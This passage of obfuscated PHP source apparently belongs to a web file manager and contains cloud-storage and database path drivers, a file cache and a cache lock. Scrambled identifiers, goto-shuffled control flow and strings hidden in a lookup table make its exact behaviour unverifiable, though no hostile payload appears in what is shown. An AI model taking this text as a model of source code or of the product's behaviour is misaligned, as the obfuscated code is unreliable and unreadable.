$céÊø†”ó[33], $céÊø†”ó[76] => $FÈŠö¨­­); } goto BÆê±õ‚¢é; BÆê±õ‚¢é: return array($céÊø†”ó[29] => $céÊø†”ó[865], $céÊø†”ó[1216] => $E‚‘ßô°¤->pathDriver, $céÊø†”ó[76] => $FÈŠö¨­­); goto bá¼–ÜĞ”; bá¼–ÜĞ”: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($A·İëè‰‹») { parent::__construct($A·İëè‰‹»); $this->signatureVersion($_SERVER[Ö‘Øù][212]); } public function uploadFormData($D‰ÚÏÔòª¾, $Bó”Ê»šò— = 3600) { goto cÍ÷æÈïº„; eËßÔÑ¸ˆ: $F»è®ø‚œ = array($A—Ğ™“Óö‡[1225] => $B´Ñ¹×ä , $A—Ğ™“Óö‡[1226] => array(array($A—Ğ™“Óö‡[1227] => $d´ïÇ†ö¼…), array($A—Ğ™“Óö‡[1228] => $this->bucket), array($A—Ğ™“Óö‡[1229], $A—Ğ™“Óö‡[1230], $A—Ğ™“Óö‡[33]), array($A—Ğ™“Óö‡[1231] => $AºÌ•©óî), array($A—Ğ™“Óö‡[1232] => $e„¥„ì­İ’), array($A—Ğ™“Óö‡[1233] => $this->accessKey), array($A—Ğ™“Óö‡[1234] => $a¥è·’ø³))); $F»è®ø‚œ = json_encode($F»è®ø‚œ); $C²µ¢‡­ = hash_hmac($A—Ğ™“Óö‡[230], $a¥è·’ø³, $this->secret); goto B¾ñ¡ÖğñÉ; fæ¥æÎ­ó: $AºÌ•©óî = $A—Ğ™“Óö‡[1223]; $B´Ñ¹×ä  = gmdate($A—Ğ™“Óö‡[1224], time() + $Bó”Ê»šò—); $a¥è·’ø³ = (string) time() . $A—Ğ™“Óö‡[68] . (string) (time() + $Bó”Ê»šò—); goto eËßÔÑ¸ˆ; cÍ÷æÈïº„: $A—Ğ™“Óö‡ =& $_SERVER[Ö‘Øù]; $d´ïÇ†ö¼… = $A—Ğ™“Óö‡[192]; $e„¥„ì­İ’ = $A—Ğ™“Óö‡[230]; goto fæ¥æÎ­ó; B¾ñ¡ÖğñÉ: $B¥¾“ğ§Ô‡ = sha1($F»è®ø‚œ); $AÕé›»„­ = hash_hmac($A—Ğ™“Óö‡[230], $B¥¾“ğ§Ô‡, $C²µ¢‡­); $BµÜÑÙËÖÙ = array($A—Ğ™“Óö‡[1227] => $d´ïÇ†ö¼…, $A—Ğ™“Óö‡[1231] => $AºÌ•©óî, $A—Ğ™“Óö‡[1235] => base64_encode($F»è®ø‚œ), $A—Ğ™“Óö‡[1232] => $e„¥„ì­İ’, $A—Ğ™“Óö‡[1233] => $this->accessKey, $A—Ğ™“Óö‡[1236] => $a¥è·’ø³, $A—Ğ™“Óö‡[1237] => $AÕé›»„­, $A—Ğ™“Óö‡[175] => $this->getHost()); goto dÈ·£¾ä¤å; dÈ·£¾ä¤å: return $BµÜÑÙËÖÙ; goto bî‰µëóõÂ; bî‰µëóõÂ: } public function fileOutLink($F¤ì¡ ©¹) { $c÷ïÚ×‘¡— =& $_SERVER[Ö‘Øù]; if (substr($F¤ì¡ ©¹, 0, 7) == $c÷ïÚ×‘¡—[1238]) { $F¤ì¡ ©¹ = $c÷ïÚ×‘¡—[1239] . substr($F¤ì¡ ©¹, 7); } header($c÷ïÚ×‘¡—[159] . $F¤ì¡ ©¹); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($bÛÜÈ¾ Ö·) { $this->pathParse = $bÛÜÈ¾ Ö·; $this->model = Model($_SERVER[Ö‘Øù][1240]); } public function getPath($d±íÜšÒ“›) { return trim($d±íÜšÒ“›, $_SERVER[Ö‘Øù][8]); } public function pathFather($c¾¦Ÿäîñ) { $dãºÉØË“¢ = $this->parse($c¾¦Ÿäîñ); $dãºÉØË“¢ = $this->infoSimple($c¾¦Ÿäîñ); return $dãºÉØË“¢ ? $dãºÉØË“¢[$_SERVER[Ö‘Øù][493]] : !1; } public function pathThis($bó ÏØ–¬Ç) { $Eï‹Ï×†® = $this->infoSimple($bó ÏØ–¬Ç); return $Eï‹Ï×†® ? $Eï‹Ï×†®[$_SERVER[Ö‘Øù][28]] : !1; } public function getPathOuter($FÏÛãñÄ„ã) { if (!$FÏÛãñÄ„ã) { return $FÏÛãñÄ„ã; } $BÇ²ÖÛ¢Ã› = $this->parse($FÏÛãñÄ„ã); return KodIO::make($BÇ²ÖÛ¢Ã›[$_SERVER[Ö‘Øù][395]]); } public function copyFolderFromIO($BÛî²œ±Òæ, $A®ÛÒÂÛÂã, $E ±²‘àˆ—, $B¶œˆÌ‘×î, $bÀºÒ„íÅ½) { $C‘öÂÏ››Á = $this->model->copyFolderFromIO($BÛî²œ±Òæ, $A®ÛÒÂÛÂã, $E ±²‘àˆ—, $B¶œˆÌ‘×î, $bÀºÒ„íÅ½); return KodIO::make($C‘öÂÏ››Á); } public function isParentOf($bÃ¬¹¸ÚÁ, $DØç“ğ¡ÛÜ) { return $this->model->isParentOf($bÃ¬¹¸ÚÁ, $DØç“ğ¡ÛÜ); } public function mkfile($Dİ¸¶†Î¦Û, $Dİœ¿«¸ãè = '', $fø‰¢¸è‘ó = REPEAT_RENAME) { $aƒáèÁ­š =& $_SERVER[Ö‘Øù]; $dªßóÜâ = $this->parse($Dİ¸¶†Î¦Û); $Dİ¸¶†Î¦Û = $dªßóÜâ[$aƒáèÁ­š[395]]; for ($Cğ¬„ÜŞâ¤ = 0; $Cğ¬„ÜŞâ¤ < count($dªßóÜâ[$aƒáèÁ­š[1241]]); $Cğ¬„ÜŞâ¤++) { $AšĞ½§÷Ê„ = $dªßóÜâ[$aƒáèÁ­š[1241]][$Cğ¬„ÜŞâ¤]; if ($Cğ¬„ÜŞâ¤ == count($dªßóÜâ[$aƒáèÁ­š[1241]]) - 1) { $Dİ¸¶†Î¦Û = $this->model->mkfile($Dİ¸¶†Î¦Û, $AšĞ½§÷Ê„, $Dİœ¿«¸ãè, $fø‰¢¸è‘ó); break; } $Dİ¸¶†Î¦Û = $this->model->mkdir($Dİ¸¶†Î¦Û, $AšĞ½§÷Ê„, REPEAT_SKIP); } return $this->getPathOuter($Dİ¸¶†Î¦Û); } public function mkdir($dˆæ—Ù”Õ¬, $F«œ˜ÜŠÄ‹ = REPEAT_SKIP) { $Bîô©Œ–ÁÉ =& $_SERVER[Ö‘Øù]; $B«áš‡Ë˜š = $this->parse($dˆæ—Ù”Õ¬); $dˆæ—Ù”Õ¬ = $B«áš‡Ë˜š[$Bîô©Œ–ÁÉ[395]]; for ($Fµ±¡ÇÀ’º = 0; $Fµ±¡ÇÀ’º < count($B«áš‡Ë˜š[$Bîô©Œ–ÁÉ[1241]]); $Fµ±¡ÇÀ’º++) { $F¸Œ‡Š¢îê = $B«áš‡Ë˜š[$Bîô©Œ–ÁÉ[1241]][$Fµ±¡ÇÀ’º]; $dˆæ—Ù”Õ¬ = $this->model->mkdir($dˆæ—Ù”Õ¬, $F¸Œ‡Š¢îê, $F«œ˜ÜŠÄ‹); } return $this->getPathOuter($dˆæ—Ù”Õ¬); } public function copyFile($cÆ¨âõï, $fï•ÄÊö›´, $a—ÉÖÛÕ‡ = REPEAT_REPLACE) { $C¾ˆÇ”« =& $_SERVER[Ö‘Øù]; $bÏõê˜åÎË = $this->parse($fï•ÄÊö›´); $D®†àŞ®‡ = $this->model->copy($cÆ¨âõï, $bÏõê˜åÎË[$C¾ˆÇ”«[395]], $a—ÉÖÛÕ‡, $bÏõê˜åÎË[$C¾ˆÇ”«[76]]); return $D®†àŞ®‡ ? $this->getPathOuter($D®†àŞ®‡) : !1; } public function moveFile($FáÒˆ‡„Ï, $fõÈë¿ìö°, $E£™˜îáÍ¶ = REPEAT_REPLACE) { $dÀ¯±Ó£ò =& $_SERVER[Ö‘Øù]; $fÂ–ø§ìàÆ = $this->parse($fõÈë¿ìö°); $AÚÚ”‘À—‘ = $this->model->move($FáÒˆ‡„Ï, $fÂ–ø§ìàÆ[$dÀ¯±Ó£ò[395]], $E£™˜îáÍ¶, $fÂ–ø§ìàÆ[$dÀ¯±Ó£ò[76]]); return $AÚÚ”‘À—‘ ? $this->getPathOuter($AÚÚ”‘À—‘) : !1; } public function copy($c÷Ğä„œŞª, $B™¾·ó´×¶, $Aùö‹èÓø° = REPEAT_REPLACE) { $dç­åå = $this->parse($B™¾·ó´×¶); $cÈ÷ë¼Òâğ = $this->model->copy($c÷Ğä„œŞª, $dç­åå[$_SERVER[Ö‘Øù][395]], $Aùö‹èÓø°); return $cÈ÷ë¼Òâğ ? $this->getPathOuter($cÈ÷ë¼Òâğ) : !1; } public function moveSameAllow() { } public function move($d­øòÍ»÷Ê, $AßÆØ” á, $fª©ÕÙçñ³ = REPEAT_REPLACE) { $Bñ›å‘šÖˆ = $this->parse($AßÆØ” á); $AÈ¤™œœ¯Ã = $this->model->move($d­øòÍ»÷Ê, $Bñ›å‘šÖˆ[$_SERVER[Ö‘Øù][395]], $fª©ÕÙçñ³); return $AÈ¤™œœ¯Ã ? $this->getPathOuter($AÈ¤™œœ¯Ã) : !1; } public function remove($fÇç¥ïâŠÂ, $Bäçğ³­Í = true) { return $this->model->remove($fÇç¥ïâŠÂ, $Bäçğ³­Í); } public function rename($a¸¤ååòÆŒ, $Dßš„˜èÌŠ) { $Dƒ›œÑø¼Ç = $this->model->rename($a¸¤ååòÆŒ, $Dßš„˜èÌŠ); return $Dƒ›œÑø¼Ç ? $this->getPathOuter($a¸¤ååòÆŒ) : $Dƒ›œÑø¼Ç; } public function size($aİ¦Ãïë) { $C‡£ì‹®ô = $this->infoSimple($aİ¦Ãïë); return $C‡£ì‹®ô ? $C‡£ì‹®ô[$_SERVER[Ö‘Øù][78]] : 0; } public function infoSimple($aÊ§Ü³ø¬Ã) { return $this->model->sourceInfo($aÊ§Ü³ø¬Ã); } public function info($D¥³ùæÁ¨) { return $this->infoParse($D¥³ùæÁ¨); } public function infoAuth($Cª¢Ø‚ÖĞ) { return $this->infoParse($Cª¢Ø‚ÖĞ, !1, !0); } public function infoWithChildren($d‡ŠÆ¥Ê·®) { return $this->infoParse($d‡ŠÆ¥Ê·®, !0); } protected function infoParse($F–ë×ÈÔñø, $b®‹ì©¨Œ… = false, $C­²×Ô­±¾ = false) { if (!$b®‹ì©¨Œ…) { return $this->model->pathInfo($F–ë×ÈÔñø, $C­²×Ô­±¾); } return $this->model->pathInfoMore($F–ë×ÈÔñø); } public function infoFull($BÁÖŠ§ìó‚) { $EòöÁÊÄ¦§ =& $_SERVER[Ö‘Øù]; $fîªÕœã‘ = explode($EòöÁÊÄ¦§[8], $BÁÖŠ§ìó‚); $Bë†ğ©°‹Ú = implode($EòöÁÊÄ¦§[8], array_splice($fîªÕœã‘, 1)); return $this->model->pathInfoByPath($fîªÕœã‘[0], $Bë†ğ©°‹Ú); } public function hashSimple($aèù×ŠÙô§) { $B«†ÕŞ»¢ƒ =& $_SERVER[Ö‘Øù]; $C¹àùŒ’¯õ = $this->infoWithChildren($aèù×ŠÙô§); return $C¹àùŒ’¯õ[$B«†ÕŞ»¢ƒ[164]][$B«†ÕŞ»¢ƒ[171]]; } public function hashMd5($d’ãÒ¥ËàÀ) { $bö£½¼è =& $_SERVER[Ö‘Øù]; $Dˆë›Œ‹ç’ = $this->infoWithChildren($d’ãÒ¥ËàÀ); return $Dˆë›Œ‹ç’[$bö£½¼è[164]][$bö£½¼è[170]]; } public function exist($DÎÃ—Äª¨») { $C„‰º¿’‚¥ =& $_SERVER[Ö‘Øù]; $bŒ¨”ìÆï‘ = $this->parse($DÎÃ—Äª¨»); if (!$bŒ¨”ìÆï‘[$C„‰º¿’‚¥[76]]) { return $this->isFile($DÎÃ—Äª¨») || $this->isFolder($DÎÃ—Äª¨»); } $aÖî§ì…¨Ù = array($C„‰º¿’‚¥[396] => $bŒ¨”ìÆï‘[$C„‰º¿’‚¥[395]], $C„‰º¿’‚¥[28] => $bŒ¨”ìÆï‘[$C„‰º¿’‚¥[76]]); $EÔˆŒíµ­ = $this->model->where($aÖî§ì…¨Ù)->find(); return $EÔˆŒíµ­ ? !0 : !1; } public function isFile($C³â®´†Üí) { $dã‹©™¢ˆ =& $_SERVER[Ö‘Øù]; $c…¸ºëÜæˆ = $this->infoSimple($C³â®´†Üí); return $c…¸ºëÜæˆ && $c…¸ºëÜæˆ[$dã‹©™¢ˆ[405]] == $dã‹©™¢ˆ[87] ? !1 : !0; } public function isFolder($bí§ÚÚäÜ) { $cìÂâá™°± =& $_SERVER[Ö‘Øù]; $C´Õ† º = $this->infoSimple($bí§ÚÚäÜ); return $C´Õ† º && $C´Õ† º[$cìÂâá™°±[405]] == $cìÂâá™°±[87] ? !0 : !1; } public function listPath($E§–óŠÍø, $b‰‡İƒƒ…à = false) { $eÕºé³ì˜ =& $_SERVER[Ö‘Øù]; if ($E§–óŠÍø == $eÕºé³ì˜[33]) { return !1; } $bŒÂ´“ğœã = array($eÕºé³ì˜[396] => $E§–óŠÍø); if ($b‰‡İƒƒ…à) { return $this->model->listSource($bŒÂ´“ğœã, -1); } return $this->model->listSource($bŒÂ´“ğœã); } public function has($cºÏåÒé´±, $d˜÷¢ßó‘÷ = false, $eÏÑ°Ê‘Âã = null) { $EÕœÉ‹±êº =& $_SERVER[Ö‘Øù]; $föà‚§ö = $this->infoWithChildren($cºÏåÒé´±); if ($d˜÷¢ßó‘÷) { return array($EÕœÉ‹±êº[204] => $föà‚§ö[$EÕœÉ‹±êº[204]], $EÕœÉ‹±êº[203] => $föà‚§ö[$EÕœÉ‹±êº[203]]); } return $eÏÑ°Ê‘Âã ? $föà‚§ö[$EÕœÉ‹±êº[204]] : $föà‚§ö[$EÕœÉ‹±êº[203]]; } public function listAll($C×Ô„Ö³Å) { $CÛ«„Âõ¯† = IO::info($this->pathParse[$_SERVER[Ö‘Øù][76]]); if (!$CÛ«„Âõ¯†) { return array(); } return $this->model->listAll($C×Ô„Ö³Å); } public function getContent($C‘¼‰„öã) { return $this->model->getContent($C‘¼‰„öã); } public function setContent($F…ÄíÊ¯Ø, $CèâŞ¦¸Û = '') { return $this->model->setContent($F…ÄíÊ¯Ø, $CèâŞ¦¸Û); } public function fileSubstr($Aéç¼åâš, $Dó¸ç‚Õ‡, $Cïºœá›Ö) { return $this->model->fileSubstr($Aéç¼åâš, $Dó¸ç‚Õ‡, $Cïºœá›Ö); } public function download($Côìø‹ƒš°, $b´Ñƒ‚Ç¢Ö = '') { $FÓ‹„©”® = get_path_father($b´Ñƒ‚Ç¢Ö); $cíÌå¡ˆÌ— = get_path_this($b´Ñƒ‚Ç¢Ö); $fĞŠ«ø°©ï = $this->model->fileInfoGet($Côìø‹ƒš°); $b˜®Ï÷ˆŒ¿ = IO::copy($fĞŠ«ø°©ï[$_SERVER[Ö‘Øù][76]], $FÓ‹„©”®, !1, $cíÌå¡ˆÌ—); return $b˜®Ï÷ˆŒ¿; } public function setModifyTime($BìÍ©ª—†, $a¥Ãº…Œí‰ = '') { $fØåéõ£¼ =& $_SERVER[Ö‘Øù]; if (!$BìÍ©ª—†) { return; } $this->model->where(array($fØåéõ£¼[412] => $BìÍ©ª—†))->save(array($fØåéõ£¼[84] => $a¥Ãº…Œí‰)); } public function upload($dÂÀ±÷ø‹Î, $d¸’Ê‡Ù› , $Dˆø©ÒÑ‘å = false, $d—‹²µìÛ¶ = REPEAT_REPLACE) { $AÓ³öÕÒ”Æ =& $_SERVER[Ö‘Øù]; $aÉ•Î×¬¦„ = $this->parse($dÂÀ±÷ø‹Î); $E±µª–ÒÈ = $this->model->addFile($aÉ•Î×¬¦„[$AÓ³öÕÒ”Æ[395]], $d¸’Ê‡Ù› , $aÉ•Î×¬¦„[$AÓ³öÕÒ”Æ[76]], $Dˆø©ÒÑ‘å, $d—‹²µìÛ¶); return $this->getPathOuter($E±µª–ÒÈ); } public function uploadFileByID($DŒ’‹¾ªé, $Aµ›¯Î¹˜ö, $b—»Á‡Õ™) { $e‡÷‡Ç†Õ =& $_SERVER[Ö‘Øù]; $Cí¾¹³Ì  = $this->parse($DŒ’‹¾ªé); $f¬ÂÇ±ÇÛÚ = $this->model->addFileByFileID($Cí¾¹³Ì [$e‡÷‡Ç†Õ[395]], $Aµ›¯Î¹˜ö, $Cí¾¹³Ì [$e‡÷‡Ç†Õ[76]], $b—»Á‡Õ™); return $this->getPathOuter($f¬ÂÇ±ÇÛÚ); } public function addFileByRemote($c¡Ô¾Úë˜˜, $fÍ‹ŒÕÎºù, $eÆ†Ã°»Íõ = array(), $A÷ìÙ¼Ò¡Ç = '', $b±»Á¤ÓÓ¶) { $Fƒí”ƒâŠë =& $_SERVER[Ö‘Øù]; $e¢Â˜½Æ = $this->parse($c¡Ô¾Úë˜˜); $A÷ìÙ¼Ò¡Ç = empty($A÷ìÙ¼Ò¡Ç) ? $e¢Â˜½Æ[$Fƒí”ƒâŠë[76]] : $A÷ìÙ¼Ò¡Ç; $dùÆƒíÇ‚Õ = $this->model->addFileByRemote($e¢Â˜½Æ[$Fƒí”ƒâŠë[395]], $fÍ‹ŒÕÎºù, $A÷ìÙ¼Ò¡Ç, $eÆ†Ã°»Íõ, $b±»Á¤ÓÓ¶); return $this->getPathOuter($dùÆƒíÇ‚Õ); } public function uploadLink($BÑ„ÏìŒ„è, $D››èÎó = 0) { $BƒŸµ¶ÔÙ£ =& $_SERVER[Ö‘Øù]; $eÛ™Â²Ê¸Ş = $this->parse($BÑ„ÏìŒ„è); $f‹ÒùŒß— = _get($GLOBALS[$BƒŸµ¶ÔÙ£[7]], $BƒŸµ¶ÔÙ£[1242]); $DïÀ¤ÖÔ¡ = _get($GLOBALS[$BƒŸµ¶ÔÙ£[7]], $BƒŸµ¶ÔÙ£[1243]); $BÑ„ÏìŒ„è = Model($BƒŸµ¶ÔÙ£[598])->createFileName($eÛ™Â²Ê¸Ş[$BƒŸµ¶ÔÙ£[76]], $f‹ÒùŒß—, $DïÀ¤ÖÔ¡); return IO::uploadLink($BÑ„ÏìŒ„è, $D››èÎó); } public function fileNameAuto($e×Š¥²½Ò¹, $CÜ‘ÅÁË’, $F…î¾®—±Á = REPEAT_REPLACE, $f–«Î™ù¡¦ = false) { return $this->model->fileNameAuto($e×Š¥²½Ò¹, $CÜ‘ÅÁË’, $F…î¾®—±Á, $f–«Î™ù¡¦); } public function fileNameExist($F»¾ÍÉ¢„œ, $dœ±µîö°Ø) { return $this->model->fileNameExist($F»¾ÍÉ¢„œ, $dœ±µîö°Ø); } protected function _fileOut($c™ßÎƒÒ²ˆ, $eñ’îõÃ  = false, $A®ìÑ÷–Ÿ§ = false, $fÌëô¦»ğÃ = '', $A„öï…ÕµÑ = false) { goto Fù½ºîËè¹; CØ‡ÖÑ£Â¬: if ($A„öï…ÕµÑ) { return IO::fileOutServer($eºÉ£³³¤[$b¹·§¶øõ[76]], $eñ’îõÃ , $eù–‚ÕàÓÄ, $fÌëô¦»ğÃ); } IO::fileOut($eºÉ£³³¤[$b¹·§¶øõ[76]], $eñ’îõÃ , $eù–‚ÕàÓÄ, $fÌëô¦»ğÃ); goto e Áé©ğÉ ; Cé˜Ö²ùø™: $eºÉ£³³¤ = $this->model->fileInfoGet($c™ßÎƒÒ²ˆ); $fÌëô¦»ğÃ = $eºÉ£³³¤[$b¹·§¶øõ[170]] ? $eºÉ£³³¤[$b¹·§¶øõ[170]] : $fÌëô¦»ğÃ; $eù–‚ÕàÓÄ = isset($GLOBALS[$b¹·§¶øõ[1245]]) ? $GLOBALS[$b¹·§¶øõ[1245]] : $f‘­ÕØÏÉ[$b¹·§¶øõ[28]]; goto CØ‡ÖÑ£Â¬; Fù½ºîËè¹: $b¹·§¶øõ =& $_SERVER[Ö‘Øù]; $f‘­ÕØÏÉ = $this->model->sourceInfo($c™ßÎƒÒ²ˆ); if ($f‘­ÕØÏÉ[$b¹·§¶øõ[405]] == $b¹·§¶øõ[87]) { header($b¹·§¶øõ[1244]); die; } goto Cé˜Ö²ùø™; e Áé©ğÉ : } public function fileOut($c¨Ş¸‡éŠ, $dØÁÏ©ñï = false, $bğ¶ŠÒ®ŒÕ = false, $eÑøš‘³İ = '') { $this->_fileOut($c¨Ş¸‡éŠ, $dØÁÏ©ñï, $bğ¶ŠÒ®ŒÕ, $eÑøš‘³İ); } public function fileOutServer($e¡Øó‰Íö½, $DÊÕ¡†ÅòÕ = false, $EõÈÜ˜†Ó² = false, $AáÖğÃ° = '') { $this->_fileOut($e¡Øó‰Íö½, $DÊÕ¡†ÅòÕ, $EõÈÜ˜†Ó², $AáÖğÃ°, !0); } protected function _fileOutImage($f¡ÚÀî¿Ûª, $BİÅ‰ÌÎ”Ù = 250) { goto aˆ²ïµ¤; aˆ²ïµ¤: $Bõ…£¶ãØ =& $_SERVER[Ö‘Øù]; $aéÚğ„ƒ´ = $this->model->pathInfo($f¡ÚÀî¿Ûª); if ($aéÚğ„ƒ´[$Bõ…£¶ãØ[405]] == $Bõ…£¶ãØ[87]) { show_json($Bõ…£¶ãØ[1246] . $f¡ÚÀî¿Ûª, !1); } goto BÃÚÏÃ¹é; BÃÚÏÃ¹é: $c¬›ËÓØ¸ = $this->model->fileInfoGet($f¡ÚÀî¿Ûª); $c¬›ËÓØ¸[$Bõ…£¶ãØ[28]] = $aéÚğ„ƒ´[$Bõ…£¶ãØ[28]]; $c¬›ËÓØ¸[$Bõ…£¶ãØ[163]] = $aéÚğ„ƒ´[$Bõ…£¶ãØ[163]]; goto f°»–ƒò; f°»–ƒò: $GLOBALS[$Bõ…£¶ãØ[1245]] = $c¬›ËÓØ¸[$Bõ…£¶ãØ[28]]; $GLOBALS[$Bõ…£¶ãØ[162]] = $c¬›ËÓØ¸; IO::fileOutImage($c¬›ËÓØ¸[$Bõ…£¶ãØ[76]], $BİÅ‰ÌÎ”Ù); goto bÕ¼­¦é…; bÕ¼­¦é…: } public function fileOutImage($D÷´“ß¼ë§, $e‹®Æ˜·Ä¹ = 250) { $this->_fileOutImage($D÷´“ß¼ë§, $e‹®Æ˜·Ä¹); } public function fileOutImageServer($DÉ‚Ê¢Ì, $dœˆå‰’¼Ó = 250) { $this->_fileOutImage($DÉ‚Ê¢Ì, $dœˆå‰’¼Ó); } public function link($DÚ›­Â’ÓÅ, $céõäÕäÏÚ = '') { $DÍÔŸ§ŠÛ— = $this->model->fileInfoGet($DÚ›­Â’ÓÅ); return IO::link($DÍÔŸ§ŠÛ—[$_SERVER[Ö‘Øù][76]], $céõäÕäÏÚ); } protected function parse($Cò‘ªÈˆØ°) { $Eõë‰­¼ÃØ =& $_SERVER[Ö‘Øù]; if (strstr($Cò‘ªÈˆØ°, $Eõë‰­¼ÃØ[8]) === !1) { return array($Eõë‰­¼ÃØ[414] => intval($Cò‘ªÈˆØ°), $Eõë‰­¼ÃØ[76] => $Eõë‰­¼ÃØ[33], $Eõë‰­¼ÃØ[1241] => array()); } $cˆç¤Óòˆ = explode($Eõë‰­¼ÃØ[8], trim($Cò‘ªÈˆØ°, $Eõë‰­¼ÃØ[8])); if (count($cˆç¤Óòˆ) < 2) { show_tips($Cò‘ªÈˆØ° . $Eõë‰­¼ÃØ[1247]); } return array($Eõë‰­¼ÃØ[414] => intval($cˆç¤Óòˆ[0]), $Eõë‰­¼ÃØ[76] => $cˆç¤Óòˆ[1], $Eõë‰­¼ÃØ[1241] => array_slice($cˆç¤Óòˆ, 1)); } } goto BË„·–á´; AãŒÙ ‘Ä: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($BÎó¦¾ÒØ, $b¤…¨Ï…¬î) { $A†¥ÌÎÉõ =& $_SERVER[Ö‘Øù]; $this->cachePath = $BÎó¦¾ÒØ[$A†¥ÌÎÉõ[76]]; $this->prefix = $A†¥ÌÎÉõ[841]; $this->cacheTime = $b¤…¨Ï…¬î; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($b¨¿ÎØ‰ˆù) { $dØÄÉ±ŠÛ‘ =& $_SERVER[Ö‘Øù]; $b¨¿ÎØ‰ˆù = str_replace(array($dØÄÉ±ŠÛ‘[842], $dØÄÉ±ŠÛ‘[97], $dØÄÉ±ŠÛ‘[70]), $dØÄÉ±ŠÛ‘[843], $b¨¿ÎØ‰ˆù); return $this->cachePath . $dØÄÉ±ŠÛ‘[844] . $b¨¿ÎØ‰ˆù . $dØÄÉ±ŠÛ‘[845]; } public function set($E‰ÓÒŒ›ÚÛ, $AºĞ…ôĞŒ, $bŒ–íÕšñö = false) { $E‰Ñˆô¾Œ‰ = $this->getFile($E‰ÓÒŒ›ÚÛ); if (file_put_contents($E‰Ñˆô¾Œ‰, $this->prefix . $AºĞ…ôĞŒ, LOCK_EX)) { @touch($E‰Ñˆô¾Œ‰, intval(time() + $bŒ–íÕšñö)); clearstatcache(); return !0; } @unlink($E‰Ñˆô¾Œ‰); return !1; } public function get($bÛã³Ã©¹Î) { $f²İÓÃ¬…÷ = $this->getFile($bÛã³Ã©¹Î); if (file_exists($f²İÓÃ¬…÷) && filemtime($f²İÓÃ¬…÷) < time()) { @unlink($f²İÓÃ¬…÷); return !1; } $d•ì¸¤„ĞÃ = @file_get_contents($f²İÓÃ¬…÷); return substr($d•ì¸¤„ĞÃ, strlen($this->prefix)); } public function remove($F…×µÅ—Ô) { $CÅƒÚÔ—œ = $this->getFile($F…×µÅ—Ô); return @unlink($CÅƒÚÔ—œ); } public function deleteAll() { $aµ«‘©ÌÈ =& $_SERVER[Ö‘Øù]; $bØÁâÀÁß– = scandir($this->cachePath); foreach ($bØÁâÀÁß– as $E«±ùìµ’‹) { $D“„ñŠá„ˆ = $this->cachePath . $E«±ùìµ’‹; if (strpos($D“„ñŠá„ˆ, $aµ«‘©ÌÈ[845]) && strpos($D“„ñŠá„ˆ, $aµ«‘©ÌÈ[846])) { @unlink($D“„ñŠá„ˆ); } } } public function clearTimeout() { $DØ¸ìˆ°Ü =& $_SERVER[Ö‘Øù]; $B¿ŞÂ¹Æø = scandir($this->cachePath); foreach ($B¿ŞÂ¹Æø as $D¶”º ‚œó) { $c¨¿†ĞÚŠã = $this->cachePath . $D¶”º ‚œó; if (strpos($c¨¿†ĞÚŠã, $DØ¸ìˆ°Ü[845]) && strpos($c¨¿†ĞÚŠã, $DØ¸ìˆ°Ü[846]) && filemtime($c¨¿†ĞÚŠã) < time()) { @unlink($c¨¿†ĞÚŠã); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto BË¤ìó•Î; AÀî‹œø÷Ô: if ($e¨áëïë’İ == $a§Ã¶³º½[17] && $béµÂ²ŞÖà == $a§Ã¶³º½[9]) { $e¨áëïë’İ = $a§Ã¶³º½[193]; } switch ($e¨áëïë’İ) { case $a§Ã¶³º½[830]: self::$handle = new CacheLockRedis(); break; case $a§Ã¶³º½[831]: self::$handle = new CacheLockMemcached(); break; case $a§Ã¶³º½[17]: self::$handle = new CacheLockDatabase(); break; case $a§Ã¶³º½[193]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto e†Öµ‘ö; BË¤ìó•Î: $a§Ã¶³º½ =& $_SERVER[Ö‘Øù]; if (self::$handle) { return self::$handle; } $BÌ§ˆÆĞ‹ç = $GLOBALS[$a§Ã¶³º½[6]][$a§Ã¶³º½[347]]; goto dšÑİ‰Éƒ; dšÑİ‰Éƒ: self::$timeout = $BÌ§ˆÆĞ‹ç[$a§Ã¶³º½[847]] ? $BÌ§ˆÆĞ‹ç[$a§Ã¶³º½[847]] : 10; $béµÂ²ŞÖà = _get($GLOBALS[$a§Ã¶³º½[6]], $a§Ã¶³º½[848]); $e¨áëïë’İ = $BÌ§ˆÆĞ‹ç[$a§Ã¶³º½[827]] ? $BÌ§ˆÆĞ‹ç[$a§Ã¶³º½[827]] : $a§Ã¶³º½[193]; goto AÀî‹œø÷Ô; e†Öµ‘ö: } private static function key($Fº‚ùÇÇ·Ñ) { return $_SERVER[Ö‘Øù][849] . Cache::key($Fº‚ùÇÇ·Ñ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($e¦à“¯´à… = '') { self::$errorMsg = $e¦à“¯´à…; } public static function lockGlobal($dÂá»°Î, $d‚ëÑÄºÍ) { return self::lock($dÂá»°Î, $d‚ëÑÄºÍ, !0); } public static function lock($eƒí‰êÕä», $cÙ£¥Ù“ì = false, $fÇÒ¢ âÓ = false) { goto D¾×ŸÙŸ£ê; D¾×ŸÙŸ£ê: $f³ç™¿ÙÑ =& $_SERVER[Ö‘Øù]; $c‰Ä‚Ñ¦†İ = self::init(); $C‹ŞîÑÏë÷ = self::key($eƒí‰êÕä»); goto cÏ‹£–Ó; cÏ‹£–Ó: $cÙ£¥Ù“ì = $cÙ£¥Ù“ì ? $cÙ£¥Ù“ì : self::$timeout; $D±Ú÷ŒïËã = $c‰Ä‚Ñ¦†İ->lock($C‹ŞîÑÏë÷, $cÙ£¥Ù“ì); if (!$D±Ú÷ŒïËã) { $bÙÚòèŞ† = "\x6c\x6f\143\x6b\40\145\162\x72\x6f\x72\x3b\x6b\x65\171\x3d{$eƒí‰êÕä»}\x3b\164\x69\x6d\x65\x3d{$cÙ£¥Ù“ì}\x3b" . self::$errorMsg . $f³ç™¿ÙÑ[68] . get_caller_msg(); $eÂÚğ¡ŒÅ = LNG($f³ç™¿ÙÑ[850]) . "\50{$cÙ£¥Ù“ì}\x73\51\x2e" . LNG($f³ç™¿ÙÑ[851]); $eÂÚğ¡ŒÅ .= $f³ç™¿ÙÑ[852]; if (is_string(self::$errorMsg) && self::$errorMsg) { $eÂÚğ¡ŒÅ = $eÂÚğ¡ŒÅ . $f³ç™¿ÙÑ[853] . self::$errorMsg; } write_log($bÙÚòèŞ†, $f³ç™¿ÙÑ[854]); 